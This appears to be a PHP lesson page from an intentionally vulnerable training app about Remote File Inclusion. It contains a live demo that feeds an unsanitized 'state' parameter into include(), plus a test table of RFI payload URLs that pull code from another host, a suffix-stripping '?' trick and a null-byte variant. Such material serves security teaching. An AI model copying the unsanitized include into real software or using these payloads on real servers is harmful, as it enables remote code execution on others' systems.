



<?php
include('top.php');
?>

<div class="panel  panel-info">
  <div class="panel-heading"><i class="fa fa-eye-slash"></i>  Threat</div>
  <div class="panel-body">
An adversary can execute his/her own code in the server.</div>
</div>

<div class="panel  panel-warning">
  <div class="panel-heading"><i class="fa fa-quote-left"></i>  Brief Description</div>
  <div class="panel-body"><p>
Allowing invalidated inputs to control files that are included dynamically in PHP/JSP/ASP/Perl code can lead to malicious file inclusion attack. When the file that is included is derived from another host or website, it is termed as Remote File Inclusion.</p>
<p>
To enable code-reuse and modular programming, modern languages allow common functions to be written into a common library file. This library file is then included into main application program files, using file include functions. These included library files are interpreted by the compiler as part of the main application program in which they were included. 
File inclusion vulnerabilities occur when the path of the included library file can be controlled via unvalidated user input.</p>
</div>
</div>
<div class="panel  panel-success">
  <div class="panel-heading"><i class="fa fa-terminal"></i>  Test Case <span class="badge pull-right">OTG-AUTHZ-001</span></div>
  <div class="panel-body">
Is Remote File Inclusion attack possible?

</div>
</div>

<p class=pull-right><b>Severity:</b> <span class="label label-danger"> High</span></p>
<br><hr />

<div class="well">

<center><h2><span class="label label-info">Demo</span></h2></center>
<hr/>

       <center> <h2 class="form-signin-heading">Map Viewer </h2> </center>


<form method="get"  class="form-signin">
 <div class="form-group">
  <select class="form-control" id="sel1" name="state">
    <option>Maharashtra</option>
    <option>Karnataka</option>
    <option>Delhi</option>
    <option>Punjab</option>
  </select>
</div>

        <button class="btn btn-lg btn-primary btn-block" type="submit" name="submit" value="submit" >Select State</button>
    </form>
		<center><?php
    if (isset( $_GET['state'] ) ){
			include(  $_GET['state']  . ".php");
		//echo  "<h1>" . $_GET['state']  . "</h1>";
    }
?>
	  </center>
	  
	  
</div>Tools Required:
<span class="label label-default">Burp Suite</span>
<span class="label label-default">Inspect Element</span>
<br /> <hr />
<h2>How to test? </h2>

<style type="text/css">
	table.tableizer-table {
	border: 1px solid #CCC; font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
} 
.tableizer-table td {
	padding: 4px;
	margin: 3px;
	border: 1px solid #ccc;
}
.tableizer-table th {
	background-color: #104E8B; 
	color: #FFF;
	font-weight: bold;
}
</style><table class="tableizer-table">
<tr class="tableizer-firstrow"><th>S. No.</th><th>Testing Technique</th><th>Where to Apply</th><th>Expected Results</th><th>Interpretation</th></tr>
 <tr><td>1</td><td>A simple include - 
we can include a file index.txt which is hosted on a website that does not have a PHP interpreter.<br />
http://localhost:8080/2/Home.php?header=http://192.168.0.144:8081/2/index.txt<br />
index.txt contains
&lt;?php phpinfo() ?&gt;
</td><td>Any page that accepts a relative URL or file name as an input</td><td>Then the lines in index.txt will be included as PHP code into Home.php on the target server
It should give PHP information of the victim server
</td><td>Unsafe</td></tr>
 <tr><td>2</td><td>Inclusion into a parameter that  is suffixed with an extension (.php, .inc, .pl, .asp, .jsp)<br />
Get rid of suffix using by turning them into URL querystrings. Use the ? character. <br />
http://localhost:8080/2/default.php?header=http://192.168.0.144:8081/2/index.txt?



</td><td>Any page that accepts a relative URL or file name as an input</td><td>Now the suffixed extension will become a URL querystring, ?.php</td><td>Unsafe</td></tr>
 <tr><td>3</td><td>""</td><td>""</td><td>IThe interpreter will try to open and execute the file index.txt\0/home.php</td><td>Unsafe</td></tr>
</table>


 <?php 
 include('bottom.php')
 ?>